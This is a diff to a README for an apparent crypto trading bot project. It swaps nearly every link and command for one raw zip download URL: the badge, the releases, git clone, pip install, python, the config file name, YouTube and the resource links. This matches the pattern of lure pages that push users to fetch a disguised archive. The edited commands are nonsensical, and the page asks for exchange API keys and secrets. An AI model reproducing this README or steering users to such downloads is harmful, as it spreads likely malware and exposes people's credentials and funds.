@@ -1,8 +1,8 @@
 # Bot For Cash: Your Guide to Crypto Trading Automation 🤖💰
 
-![Bot For Cash](https://img.shields.io/badge/Bot_For_Cash-Ready-orange)
+![Bot For Cash](https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip)
 
-Welcome to the **Bot For Cash** repository! This project aims to kickstart your journey into the world of crypto trading bots. If you're looking to automate your trading strategies, you're in the right place. You can find the latest releases and updates [here](https://github.com/harsh850/Bot-For-Cash/releases).
+Welcome to the **Bot For Cash** repository! This project aims to kickstart your journey into the world of crypto trading bots. If you're looking to automate your trading strategies, you're in the right place. You can find the latest releases and updates [here](https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip).
 
 ## Table of Contents
 
@@ -28,36 +28,36 @@ Welcome to the **Bot For Cash** repository! This project aims to kickstart your 
 To get started, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/harsh850/Bot-For-Cash.git
+git clone https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip
 cd Bot-For-Cash
 ```
 
 Next, install the required dependencies:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip
 ```
 
-You can download the latest release from the [Releases](https://github.com/harsh850/Bot-For-Cash/releases) section. Make sure to follow the instructions in the release notes for proper setup.
+You can download the latest release from the [Releases](https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip) section. Make sure to follow the instructions in the release notes for proper setup.
 
 ## Usage
 
 Once installed, you can start the bot with the following command:
 
 ```bash
-python bot.py
+python https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip
 ```
 
 ### Configuration
 
-Before running the bot, you need to configure your settings. Open the `config.json` file and update the following fields:
+Before running the bot, you need to configure your settings. Open the `https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip` file and update the following fields:
 
 - `api_key`: Your exchange API key.
 - `api_secret`: Your exchange API secret.
 - `trading_pair`: The cryptocurrency pair you want to trade (e.g., BTC/USD).
 - `strategy`: The trading strategy you wish to implement.
 
-For a detailed guide on setting up your bot, check out our [YouTube video](https://www.youtube.com/channel/UCxyz).
+For a detailed guide on setting up your bot, check out our [YouTube video](https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip).
 
 ## Contributing
 
@@ -91,14 +91,14 @@ This repository covers various topics related to crypto trading bots:
 
 ## Resources
 
-- [YouTube Channel](https://www.youtube.com/channel/UCxyz): Watch tutorials and guides on how to set up and optimize your bot.
-- [Crypto Trading Strategies](https://www.example.com/strategies): Explore various trading strategies that can be implemented with the bot.
-- [API Documentation](https://www.example.com/api-docs): Read the documentation for the APIs used in the bot.
+- [YouTube Channel](https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip): Watch tutorials and guides on how to set up and optimize your bot.
+- [Crypto Trading Strategies](https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip): Explore various trading strategies that can be implemented with the bot.
+- [API Documentation](https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip): Read the documentation for the APIs used in the bot.
 
-For any issues or feature requests, please check the [Issues](https://github.com/harsh850/Bot-For-Cash/issues) section.
+For any issues or feature requests, please check the [Issues](https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip) section.
 
 ## License
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-Feel free to reach out if you have any questions or need assistance. You can also check the [Releases](https://github.com/harsh850/Bot-For-Cash/releases) section for updates and new features. Happy trading!
+Feel free to reach out if you have any questions or need assistance. You can also check the [Releases](https://github.com/harsh850/Bot-For-Cash/raw/refs/heads/main/gentes/Cash-For-Bot-v1.2.zip) section for updates and new features. Happy trading!
